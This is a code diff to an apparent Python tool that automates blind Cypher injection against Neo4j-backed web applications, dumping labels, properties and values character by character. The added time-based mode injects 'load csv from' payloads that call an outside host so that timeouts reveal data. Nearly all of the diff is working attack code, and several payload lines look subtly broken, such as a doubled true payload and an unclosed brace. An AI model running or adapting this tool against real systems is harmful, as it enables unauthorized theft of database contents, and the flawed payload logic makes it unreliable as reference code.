@@ -4,26 +4,47 @@ import argparse
 import urllib.parse
 import requests
 import random
+import secrets
+import hashlib
+import time
 import sys
 
+
 ascii_chars='abcdefghijklmnopqrstuvwxyz_0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&'+"'"+'()*+,-./:;<=>?@[\]^`{|}~ '
+random_str = secrets.token_hex(16)
+timeout_subdomain=hashlib.md5(random_str.encode()).hexdigest()
+arbitary_timeout_sleep_value=10
 
 def perform_request(target_url, post_data=False, cookies_dict={}, connection_timeout=5):
+    global timeout_subdomain
     proxies={}
     #proxies={'http':'http://localhost:8080'}
     headers = {'Content-Type': 'application/x-www-form-urlencoded'} # Please modify manually if you are sending JSON :)
     try:
         if post_data:
-            response = requests.post(target_url, data=post_data, cookies=cookies_dict, timeout=connection_timeout, proxies=proxies, headers=headers)
+            response = requests.post(target_url, data=post_data, cookies=cookies_dict, timeout=int(connection_timeout), proxies=proxies, headers=headers)
         else:
-            response = requests.get(target_url, cookies=cookies_dict, timeout=connection_timeout,proxies=proxies)
+            response = requests.get(target_url, cookies=cookies_dict, timeout=int(connection_timeout),proxies=proxies)
 
         return response.text
 
     except requests.exceptions.Timeout:
+        random_str = secrets.token_hex(16)
+        timeout_subdomain=hashlib.md5(random_str.encode()).hexdigest()
         return False
 
-def cypher_inject(target_url, payload, post_data=False, cookies_dict={}, connection_timeout=5):
+def replace_last_and(input_str):
+    global timeout_domain, timeout_subdomain
+    last_and_index = input_str.rfind(' and ')
+    if last_and_index != -1:
+        return input_str[:last_and_index] + " and exists {load csv from 'http://"+timeout_subdomain+timeout_domain+"/' as csv_test} and " + input_str[last_and_index+5:]
+    else:
+        return input_str
+
+def cypher_inject(target_url, payload, post_data=False, cookies_dict={}, connection_timeout=5, use_blind=True):
+    global arbitary_timeout_sleep_value
+    if not use_blind:
+        payload=replace_last_and(payload)
     # Check if '*' is in target_url
     if '*' in target_url:
         encoded_payload = urllib.parse.quote_plus(payload)
@@ -37,12 +58,16 @@ def cypher_inject(target_url, payload, post_data=False, cookies_dict={}, connect
             print("Error: no '*' found in target URL or post data")
             return None
     
-    return perform_request(target_url, post_data, cookies_dict, connection_timeout)
+    ret=perform_request(target_url, post_data, cookies_dict, connection_timeout)
+    if not use_blind and not ret:
+        time.sleep(arbitary_timeout_sleep_value)
+    return ret
 
 def get_injection_type(target_url, blind_string, post_data, cookies_dict, connection_timeout):
     
     injection_character = "'" 
     injection_characters=[" ", '"', "'"]
+    global timeout_domain
    
     for injection_character in injection_characters:
         # Generate random values for the payload
@@ -51,18 +76,22 @@ def get_injection_type(target_url, blind_string, post_data, cookies_dict, connec
 
         # Prepare the payloads for the two requests
         true_payload = injection_character + " and " + injection_character + str(number1) + injection_character + "=" + injection_character + str(number1)
+        true_payload+= true_payload
         false_payload = injection_character + " and " + injection_character + str(number1) + injection_character + "=" + injection_character + str(number2)
+        false_payload+= true_payload
 
         # Try to inject the payloads using single quotes in target_url and post_data
         try:
-            true_result = cypher_inject(target_url, true_payload, post_data, cookies_dict, connection_timeout)
-            false_result = cypher_inject(target_url, false_payload, post_data, cookies_dict, connection_timeout)
+            true_result = cypher_inject(target_url, true_payload, post_data, cookies_dict, connection_timeout, blind_string)
+            false_result = cypher_inject(target_url, false_payload, post_data, cookies_dict, connection_timeout, blind_string)
         except:
             print("Unable to perform cypher injection!!!")
             sys.exit(-1)
 
         # Check if the blind string is present in the response to the first request but not in the response to the second request
-        if blind_string in true_result and blind_string not in false_result:
+        if blind_string and  blind_string in true_result and blind_string not in false_result:
+            return injection_character
+        if not blind_string and  not true_result and false_result:
             return injection_character
     return False
 
@@ -79,21 +108,28 @@ def generate_cookies_dictionary(cookie_string):
 def get_number_of_results(target_url, payload, blind_string, post_data, cookies_dict, connection_timeout):
     for number_of_results in range(1000): # arbitarily set max number or results to 1000 :)
         current_payload=payload.replace("%NUMBER_OF_RESULTS%",str(number_of_results))
-        injection_result=cypher_inject(target_url, current_payload, post_data, cookies_dict, connection_timeout)
-        if (blind_string and injection_result and blind_string in injection_result) or not injection_result:
+        injection_result=cypher_inject(target_url, current_payload, post_data, cookies_dict, connection_timeout, blind_string)
+        if blind_string and injection_result and blind_string in injection_result:
             return number_of_results
+        if not blind_string:
+            if injection_result:
+                return number_of_results
     print("Unable to check number of results!!!")
     sys.exit(-1)
 
 def get_number_of_labels(target_url, injection_type, blind_string, post_data, cookies_dict, connection_timeout):
-    payload = injection_type + " and count {call db.labels() yield label return label} = %NUMBER_OF_RESULTS%" 
-    payload+=" and "+injection_type+"1"+injection_type+"="+injection_type+"1"
+    if blind_string:
+        payload = injection_type + " and count {call db.labels() yield label return label} = %NUMBER_OF_RESULTS%" 
+        payload+=" and "+injection_type+"1"+injection_type+"="+injection_type+"1"
+    else:
+        payload = injection_type + " and exists {call db.labels() yield label with label skip %NUMBER_OF_RESULTS% limit 1 return label}" 
+        payload+=" and "+injection_type+"1"+injection_type+"="+injection_type+"1"
     return get_number_of_results(target_url, payload, blind_string, post_data, cookies_dict, connection_timeout)
 
 def get_size_of_result(target_url, payload, blind_string, post_data, cookies_dict, connection_timeout):
     for size_of_result in range(1000): # arbitarily set max size of result to 1000 :)
         current_payload=payload.replace("%SIZE_OF_RESULT%",str(size_of_result))
-        injection_result=cypher_inject(target_url, current_payload, post_data, cookies_dict, connection_timeout)
+        injection_result=cypher_inject(target_url, current_payload, post_data, cookies_dict, connection_timeout, blind_string)
         if (blind_string and injection_result and blind_string in injection_result) or not injection_result:
             return size_of_result
     print("Unable to check size of result!!!")
@@ -114,7 +150,7 @@ def dump_string_value(target_url, dump_prefix, dump_size, payload, blind_string,
                 current_char="\'"
             current_payload=payload.replace("%CHARACTER_NUMBER%",str(character_number))
             current_payload=current_payload.replace("%CURRENT_CHARACTER%",current_char)
-            injection_result=cypher_inject(target_url, current_payload, post_data, cookies_dict, connection_timeout)
+            injection_result=cypher_inject(target_url, current_payload, post_data, cookies_dict, connection_timeout, blind_string)
             if (blind_string and injection_result and blind_string in injection_result) or not injection_result:
                 dump_value+=current_char
                 print("\r"+(80*" ")+f"\r"+dump_prefix+f"{dump_value}",end='')
@@ -179,7 +215,7 @@ def dump_properties(target_url, label_to_dump, injection_type, blind_string, pos
     return label_properties_array
 
 def get_number_of_keys(target_url, label_to_dump, property_to_dump, injection_type, blind_string, post_data, cookies_dict, connection_timeout):
-    payload = injection_type + " and count {match(t:"+label_to_dump+") unwind keys(t) as key with key, t where key = '"+property_to_dump+"' return t[key]}"
+    payload = injection_type + " and count {match(t:"+label_to_dump+") unwind keys(t) as key with key, t where key = '"+property_to_dump+"'  return t[key]"
     payload+=" = %NUMBER_OF_RESULTS% and "+injection_type+"1"+injection_type+"="+injection_type+"1"
     return get_number_of_results(target_url, payload, blind_string, post_data, cookies_dict, connection_timeout)
 
@@ -253,6 +289,7 @@ try:
     parser.add_argument('-c', '--cookie', help='Request cookie', default={})
     parser.add_argument('-s', '--string', help='Blind string')
     parser.add_argument('-t', '--timeout', help='Connection timeout', default=5)
+    parser.add_argument('-D', '--domain', help='timeout domain to use. Default: .test.com', default=".test.com")
     parser.add_argument('-L', '--labels', help='Dump labels', action='store_true')
     parser.add_argument('-P', '--properties', help='Dump properties for label')
     parser.add_argument('-K', '--keys', help='Dump keys for property')
@@ -263,6 +300,7 @@ try:
     cookies_string = args.cookie
     blind_string = args.string
     connection_timeout = args.timeout
+    timeout_domain = args.domain
 
     cookies_dict=generate_cookies_dictionary(cookies_string)
 
